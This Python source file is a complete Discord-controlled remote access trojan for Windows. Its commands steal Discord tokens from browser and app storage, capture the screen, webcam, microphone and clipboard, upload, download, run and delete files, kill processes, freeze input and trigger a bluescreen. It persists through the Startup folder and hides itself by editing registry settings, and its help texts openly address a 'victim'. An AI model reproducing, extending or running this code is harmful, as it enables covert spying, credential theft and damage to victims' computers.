from discord.ext import commands, tasks
from PIL import ImageGrab, ImageDraw
from threading import Thread
import subprocess
import webbrowser
import pyautogui
import pyperclip
import datetime
import platform
import requests
import tempfile
import asyncio
import discord
import hashlib
import pyaudio
import tarfile
import ctypes
import psutil
import shutil
import winreg
import time
import uuid
import wave
import cv2
import sys
import wmi
import io
import os
import re

TOKEN = "Discord bot token" # Do not remove this string (easy compiler looks for this) - 23r98h

FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='$', intents=intents)
bot.remove_command('help')
pyautogui.FAILSAFE = False

config_path = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Microsoft', "Config")
os.makedirs(config_path, exist_ok=True)

def sanitize_channel_name(name):
    sanitized = re.sub(r'[^a-zA-Z0-9_-]', '', name).lower()
    return sanitized

def bot_channel():
    raw_channel_name = f"{os.environ.get("COMPUTERNAME", "UnknownDevice")}-{os.getlogin()}"
    channel_name = sanitize_channel_name(raw_channel_name)
    return channel_name

@bot.command(help="Delete and recreates bots channel, wiping all the messages")
async def init(ctx):
    user = ctx.author

    if user.guild_permissions.administrator:
        channel_name = bot_channel()
        existing_channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)

        if ctx.message.content.endswith("/f"):
            if existing_channel is not None:
                await existing_channel.delete()
            overwrites = {
                ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                ctx.guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            new_channel = await ctx.guild.create_text_channel(channel_name, overwrites=overwrites)
            await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
        else:
            if existing_channel is None:
                overwrites = {
                    ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    ctx.guild.me: discord.PermissionOverwrite(read_messages=True)
                }
                new_channel = await ctx.guild.create_text_channel(channel_name, overwrites=overwrites)
                await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
            else:
                await ctx.send("Channel already exists, please run `$init /f` to wipe the channel (delete and recreate).")
    else:
        await ctx.send("You don't have permission to initialize configuration for this guild.")

@bot.event
async def on_guild_join(guild):
    channel_name = bot_channel()
    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)

    if existing_channel is None:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
        await new_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")
    else:
        await existing_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")

@bot.event
async def on_ready():
    for guild in bot.guilds:
        channel_name = bot_channel()
        existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
        logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S")

        if existing_channel is None:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
            await new_channel.edit(topic=logon_date)
            await new_channel.send(f"Victim has logged on! Use this channel for further commands.")
        else:
            await existing_channel.edit(topic=logon_date)
            await existing_channel.send(f"Victim has logged on! Use this channel for further commands.")
        print(f'Discord bot logged on as {bot.user.name}')

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    channel_name = bot_channel()
    if message.channel.name == channel_name:
        await bot.process_commands(message)
        
@bot.command()
async def sysinfo(ctx):
    windows_devicename = platform.node()
    windows_version = platform.version()
    windows_os_build = platform.win32_ver()[1]
    windows_os_type = platform.win32_ver()[0]
    timezone = time.tzname[0] if time.daylight != 0 else time.tzname[1]
    
    try:
        c = wmi.WMI()
        system = c.Win32_ComputerSystem()[0]
        bios = c.Win32_BIOS()[0]
        processor = c.Win32_Processor()[0]
        network_adapters = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
        physical_disk = c.Win32_DiskDrive()[0]
        
        serial_number = bios.SerialNumber if hasattr(bios, 'SerialNumber') else "Unknown"
        manufacturer = system.Manufacturer if hasattr(system, 'Manufacturer') else "Unknown"
        model = system.Model if hasattr(system, 'Model') else "Unknown"
        total_ram = int(system.TotalPhysicalMemory) // (1024**2) if hasattr(system, 'TotalPhysicalMemory') else "Unknown"
        total_ram_gb = total_ram / 1024 if total_ram != "Unknown" else "Unknown"
        cpu = processor.Name if hasattr(processor, 'Name') else "Unknown"
        total_main_drive_storage = int(physical_disk.Size) // (1024**3) if hasattr(physical_disk, 'Size') else "Unknown"
        network_adapter = network_adapters[0].Description.split(" - ")[-1] if network_adapters else "Unknown"
        
        uuid_process = subprocess.run(['wmic', 'csproduct', 'get', 'uuid'], capture_output=True, text=True)
        device_uuid = uuid_process.stdout.strip().split('\n')[-1]
        if device_uuid.startswith("UUID"):
            device_uuid = device_uuid.replace("UUID", "").strip()
        
        sku_number = system.IdentifyingNumber if hasattr(system, 'IdentifyingNumber') else "Unknown"
        ip = requests.get('https://api.ipify.org').content.decode('utf8')
    
    except Exception as e:
        await ctx.send(f"Error fetching system information: {e}")
        return
    
    output = "```\n"
    output += f"Windows Information:\n"
    output += f"Windows devicename: {windows_devicename}\n"
    output += f"Windows Version: {windows_version}\n"
    output += f"Windows OS Build: {windows_os_build}\n"
    output += f"Windows OS Type: {windows_os_type}\n"
    output += f"\nOther Information:\n"
    output += f"Public IP: {format(ip)}\n"
    output += f"Timezone: {timezone}\n"
    output += f"\nDevice Specifications:\n"
    output += f"Serial Number: {serial_number}\n"
    output += f"Manufacturer: {manufacturer}\n"
    output += f"Model: {model}\n"
    output += f"Total RAM: {total_ram_gb:.2f} GB ({total_ram} MB)\n"
    output += f"CPU: {cpu}\n"
    output += f"Total Main Drive Storage: {total_main_drive_storage} GB\n"
    output += f"Network adapter: {network_adapter}\n"
    output += f"Device UUID: {device_uuid}\n"
    output += f"SKU Number: {sku_number}\n"
    output += "```"
    
    if len(output) > 2000:
        with tempfile.NamedTemporaryFile(mode='w', delete=False, encoding='utf-8') as temp_file:
            temp_file.write(output)
            temp_file_name = temp_file.name
        
        await ctx.send(file=discord.File(temp_file_name))
    else:
        await ctx.send(output)

@bot.command(help="Discord-Token-Grabber by TomekLisek on replit modified as a discord command")
async def getdiscord(ctx):
    try:
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }
        message = '​\n'
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            message += f'**{platform}**```'
            path += '\\Local Storage\\leveldb'
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)
            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}'
            else:
                message += 'No tokens found.'
            message += '```'
        try:
            await ctx.send(message)
        except:
            pass
    except Exception as e:
        await ctx.send(f"Error executing getdiscord: {str(e)}")
    
@bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device.")
async def setpos(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await ctx.send("Cursor position set successfully.")
    except Exception as e:
        await ctx.send(f"Error setting cursor position: {str(e)}")

@bot.command(help="Simulate left mouse click on victim's device.")
async def lclick(ctx):
    try:
        pyautogui.click(button='left')
        await ctx.send("Left click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing left click: {str(e)}")

@bot.command(help="Simulate middle mouse click on victim's device.")
async def mclick(ctx):
    try:
        pyautogui.click(button='middle')
        await ctx.send("Middle click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing middle click: {str(e)}")

@bot.command(help="Simulate right mouse click on victim's device.")
async def rclick(ctx):
    try:
        pyautogui.click(button='right')
        await ctx.send("Right click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing right click: {str(e)}")

@bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, down, up, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg")
async def key(ctx, func: str = "", value: str = ""):
    if not func:
        await ctx.send("Function not provided. Available functions: press, down, up, hotkey.")
        return

    func = func.lower()
    
    if func not in ["press", "down", "up", "hotkey"]:
        await ctx.send("Invalid function. Available functions: press, down, up, hotkey.")
        return

    if not value or value == "":
        await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
        return
    
    try:
        if func == "press":
            pyautogui.press(value)
        elif func == "down":
            pyautogui.keyDown(value)
        elif func == "up":
            pyautogui.keyUp(value)
        elif func == "hotkey":
            keys = value.split("+")
            pyautogui.hotkey(*keys)
        
        await ctx.send("Command executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")


@bot.command(help="Get victims clipboard.")
async def get_clipboard(ctx):
    try:
        await ctx.send(f"Current clipboard: ```{pyperclip.paste()}```")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Copy given text to victims clipboard.")
async def set_clipboard(ctx, *, text: str):
    try:
        pyperclip.copy(text)
        await ctx.send(f"Copied to clipboard")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")   

@bot.command(help="Takes a screenshot of the victim's screen including cursor location.")
async def ss(ctx):
    img = ImageGrab.grab()
    cursor_position = pyautogui.position()

    draw = ImageDraw.Draw(img)
    draw.ellipse((cursor_position[0]//2-5, cursor_position[1]//2-5, cursor_position[0]//2+5, cursor_position[1]//2+5), fill=(255, 0, 0))

    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
        img.save(temp_file, 'PNG')
        await ctx.send("Command Executed! (Red dot indicates cursor)", file=discord.File(temp_file.name, filename="screenshot.png"))
        
@bot.command(name="tts", help="Run TTS on victim's system")
async def tts(ctx, *, text: str):
    global tts_process
    try:
        if tts_process is not None:
            tts_process.kill()
        await ctx.send("Command Executed!")
        tts_process = subprocess.Popen(
            ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
tts_process = None

@bot.command(name="ttsurl", help="Run TTS on victim's system!")
async def ttsurl(ctx, url: str):
    global tts_process
    try:
        if tts_process is not None:
            tts_process.kill()
        await ctx.send("Command Executed!")

        response = requests.get(url)
        text = response.text

        # Run the TTS process in a subprocess
        tts_process = subprocess.Popen(
            ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        await ctx.send("TTS process started! Use !stoptts to stop it.")
        
    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command(name="stoptts", help="Stops TTS")
async def stoptts(ctx):
    global tts_process
    if tts_process is not None:
        try:
            await ctx.send("TTS process stopped.")
            tts_process.kill()
            tts_process = None
        except Exception as e:
            await ctx.send(f"Error stopping TTS process: {str(e)}")
    else:
        await ctx.send("No TTS process running.")

@bot.command(help="Records audio from the victim's microphone for 10 seconds.")
async def listen(ctx):
    def recording_thread():
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = 10

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []

        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        with io.BytesIO() as buf:
            wf = wave.open(buf, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            buf.seek(0)
            bot.loop.call_soon_threadsafe(asyncio.create_task, send_response(ctx, buf))

    def send_response(ctx, buf):
        return ctx.send("Command Executed!", file=discord.File(fp=buf, filename="output.wav"))

    thread = Thread(target=recording_thread)
    thread.start()

@bot.command(help="Types the given text on the victim's system.")
async def write(ctx, *, text: str):
    try:
        pyautogui.write(text)
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Upload a file to a specific path on victim's system")
async def upload(ctx, folder: str = None):
    if not folder:
        await ctx.send("Error: No folder path provided. Please specify a folder to upload the file to.")
        return
    if not os.path.exists(folder):
        os.makedirs(folder)
    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(folder, attachment.filename)
        await attachment.save(file_path)
        await ctx.send(f"File `{attachment.filename}` has been saved to '{folder}'.")
    else:
        await ctx.send("Error: No file attached to the message.")

@bot.command(help="Lists contents of a folder on victim's system, format $ls {folder (D:/folder/)}")
async def ls(ctx, path: str = None):
    try:
        if not path:
            await ctx.send("Error: No path provided. Please specify a directory path to list.")
            return
        if not os.path.exists(path):
            await ctx.send(f"Error: The path '{path}' does not exist.")
            return
        if not os.path.isdir(path):
            await ctx.send(f"Error: The path '{path}' is not a directory.")
            return
        items = os.listdir(path)
        parent_dir = os.path.abspath(os.path.join(path, os.pardir))
        dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
        files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
        response = f"Parent Directory: {parent_dir}\n\n"
        if dirs or files:
            for directory in dirs:
                dir_full_path = os.path.join(path, directory)
                response += f"[DIR]  {dir_full_path}\n"
            for file in files:
                file_full_path = os.path.join(path, file)
                response += f"[FILE] {file_full_path}\n"
        else:
            response += "This directory is empty.\n"

        if len(response) > 2000:
            file_path = "directory_listing.txt"
            with open(file_path, "w") as file:
                file.write(response)
            await ctx.send(file=discord.File(file_path))
            os.remove(file_path)
        else:
            await ctx.send(response)
    except Exception as e:
        await ctx.send(f"Error: Could not list the directory contents. {str(e)}")


@bot.command(help="Runs a specified program on victim's system, format $run {file (D:/file.exe)}")
async def run(ctx, file_path: str = None):
    if not file_path:
        await ctx.send("Error: No file path provided. Please specify the file path to run.")
        return
    if not os.path.exists(file_path):
        await ctx.send(f"Error: The file '{file_path}' does not exist.")
        return
    try:
        subprocess.Popen(file_path, shell=True)
        await ctx.send(f"File '{file_path}' has been executed.")
    except Exception as e:
        await ctx.send(f"Error: Could not execute the file. {str(e)}")    

@bot.command(help="Compresses and downloads a file or folder from victim's system, format $download {file_or_folder_path (D:/file_or_folder)} (attached file is downloaded)")
async def download(ctx, file_path: str = None):
    if not file_path:
        await ctx.send("Error: No file path provided. Please specify the file or folder path to download.")
        return
    if not os.path.exists(file_path):
        await ctx.send(f"Error: The path '{file_path}' does not exist.")
        return
    
    try:
        tar_filename = os.path.basename(file_path) + '.tar.gz'
        tar_path = os.path.join(os.path.dirname(file_path), tar_filename)
        
        with tarfile.open(tar_path, "w:gz") as tar:
            if os.path.isfile(file_path):
                tar.add(file_path, arcname=os.path.basename(file_path))
            elif os.path.isdir(file_path):
                tar.add(file_path, arcname=os.path.basename(file_path))
            else:
                await ctx.send(f"Error: The path '{file_path}' is neither a file nor a folder.")
                return
        
        await ctx.send(file=discord.File(tar_path))
        os.remove(tar_path)
        
    except Exception as e:
        await ctx.send(f"Error: Could not compress and send the file or folder. {str(e)}")
    
@bot.command(help="Deletes a folder or file from the victim's system, format $delete {file (D:/file.png)}")
async def delete(ctx, path: str = None):
    if not path:
        await ctx.send("Error: No path provided. Please specify a file or folder path to delete.")
        return
    if os.path.isfile(path):
        os.remove(path)
        await ctx.send(f"File '{path}' has been deleted.")
    elif os.path.isdir(path):
        shutil.rmtree(path)
        await ctx.send(f"Folder '{path}' and all its contents have been deleted.")
    else:
        await ctx.send(f"The path '{path}' does not exist.")
        
@bot.command(help="Moves a file from one location to another on victim's system, format $move {file (D:/file.png)} {folder (D:/destination/)}")
async def move(ctx, source: str = None, destination: str = None):
    if not source or not destination:
        await ctx.send("Error: Please provide both source and destination paths.")
        return
    if not os.path.exists(source):
        await ctx.send(f"Error: The source path '{source}' does not exist.")
        return
    destination_dir = os.path.dirname(destination)
    if not os.path.exists(destination_dir):
        await ctx.send(f"Error: The destination directory '{destination_dir}' does not exist.")
        return
    try:
        shutil.move(source, destination)
        await ctx.send(f"'{source}' has been moved to '{destination}'.")
    except Exception as e:
        await ctx.send(f"Error: Could not move '{source}' to '{destination}'. {str(e)}")

@bot.command(help="Freezes the cursor on the victim's system.")
async def freezecursor(ctx):
    try:
        result = ctypes.windll.user32.BlockInput(True)
        if result == 0:
            await ctx.send("Failed to freeze cursor. Victim is not running with elevated privileges.")
        else:
            await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Unfreezes the cursor on the victim's system.")
async def unfreezecursor(ctx):
    try:
        ctypes.windll.user32.BlockInput(False)
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Attempts to trigger a blue screen on the victim's system.")
async def bluescreen(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Takes a picture on the victim's webcam.")
async def webcampic(ctx, cam: int = 0):
    try:
        cap = cv2.VideoCapture(cam)
        if not cap.isOpened():
            raise Exception("Could not open webcam")
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            raise Exception("Failed to grab frame from webcam")
        
        with io.BytesIO() as buf:
            im_encoded = cv2.imencode(".png", frame)[1]
            buf.write(im_encoded.tobytes())
            buf.seek(0)
            await ctx.send(f"Captured from camera {cam}!", file=discord.File(fp=buf, filename="webcam.png"))
            
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Lists all running tasks on the victim's system.")
async def tasks(ctx):
    processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
    
    with io.StringIO() as buf:
        for proc in processes:
            buf.write(f"PID: {proc['pid']} - Name: {proc['name']}\n")
        
        buf.seek(0)
        
        await ctx.send("List of running tasks:", file=discord.File(fp=buf, filename="tasks.txt"))

@bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.")
async def kill(ctx, arg: str = ""):
    if arg == "" or not arg:
        await ctx.send("Please enter a task to be terminated")
    try:
        pid = int(arg)
        process = psutil.Process(pid)
        process.terminate() 
        await ctx.send(f"Task with PID {pid} has been terminated!")
    except ValueError:
        terminated = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == arg:
                try:
                    psutil.Process(proc.info['pid']).terminate()
                    terminated += 1
                except psutil.NoSuchProcess:
                    pass
        if terminated > 0:
            await ctx.send(f"Terminated {terminated} processes with the name {arg}.")
        else:
            await ctx.send(f"No processes with the name {arg} found.")
    except Exception as e:
        await ctx.send(f"Error terminating task: {str(e)}")

@bot.command(help="Opens the given website on the victim's default browser and maximizes it.")
async def website(ctx, *, url: str):
    try:
        webbrowser.open(url)
        time.sleep(3)
        pyautogui.hotkey('f11')
        
        await ctx.send(f"Opened and maximized the website: {url}")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Shuts down the victim's system.")
async def shutdown(ctx):
    try:
        os.system('shutdown /s /t 1')
        await ctx.send("Command Executed! System is shutting down.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Restarts the victim's system.")
async def restart(ctx):
    try:
        os.system('shutdown /r /t 1')
        await ctx.send("Command Executed! System is restarting.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Logs off the current user on the victim's system.")
async def logoff(ctx):
    try:
        os.system('shutdown /l')
        await ctx.send("Command Executed! Logging off.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command()
async def help(ctx, command_name: str):
    command = bot.get_command(command_name)
    if command:
        embed = discord.Embed(
            title=f"Help: {command_name}",
            description=command.help if command.help else "No description provided",
            color=0x007BFF
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"Command '{command_name}' not found.")

per_page = 10

@bot.command()
async def commands(ctx, page: int = 1):
    commands_list = list(bot.commands)

    max_page = (len(commands_list) - 1) // per_page + 1

    if page < 1 or page > max_page:
        await ctx.send(f"Page {page} is out of range. Please provide a page number between 1 and {max_page}.")
        return

    start_index = (page - 1) * per_page
    end_index = start_index + per_page
    commands_on_page = commands_list[start_index:end_index]

    embed = discord.Embed(
        title="Available Commands",
        description="List of all commands",
        color=0x007BFF
    )

    for command in commands_on_page:
        embed.add_field(
            name=command.name,
            value=command.help if command.help else "No description provided",
            inline=False
        )

    embed.set_footer(text=f"Page {page}/{max_page}")

    message = await ctx.send(embed=embed)

    if max_page > 1:
        await message.add_reaction("◀️")
        await message.add_reaction("▶️")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["◀️", "▶️"] and reaction.message.id == message.id

    while True:
        try:
            reaction, user = await bot.wait_for("reaction_add", check=check)
            await message.remove_reaction(reaction, user)
            
            if str(reaction.emoji) == "◀️" and page > 1:
                page -= 1
            elif str(reaction.emoji) == "▶️" and page < max_page:
                page += 1
            
            start_index = (page - 1) * per_page
            end_index = start_index + per_page
            commands_on_page = commands_list[start_index:end_index]

            embed.clear_fields()
            for command in commands_on_page:
                embed.add_field(
                    name=command.name,
                    value=command.help if command.help else "No description provided",
                    inline=False
                )
            
            embed.set_footer(text=f"Page {page}/{max_page}")

            await message.edit(embed=embed)

        except asyncio.TimeoutError:
            break

@bot.command(help="Hides the script file and disables show hidden files.")
async def hidescript(ctx):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(reg_key)
        script_path = sys.executable
        os.system(f'attrib +h "{script_path}"')
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Makes this script execute on logon (only user that ran this file).")
async def startup(ctx):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(reg_key)
        
        script_path = sys.executable
        startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', "Programs", "Startup")
    
        if os.path.exists(startup_folder):
            script_name = os.path.basename(script_path)
    
            destination_path = os.path.join(startup_folder, script_name)
    
            shutil.copy(script_path, destination_path)
    
            print(f"Script '{script_name}' moved to the startup folder.")
            await ctx.send(f"Moved '{script_name}' to the startup folder.")
        else:
            await ctx.send(f"Startup folder \"{startup_folder}\" not found.")
        
        os.system(f'attrib +h "{destination_path}"')

    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Force stops the bot.")
async def estop(ctx):
    await ctx.send("Force stopping bot...")
    await bot.close()
    os._exit(0)

try:
    bot.run(TOKEN)
except discord.errors.LoginFailure:
    exit("\n\033[91mError: Invalid bot token.\033[0m")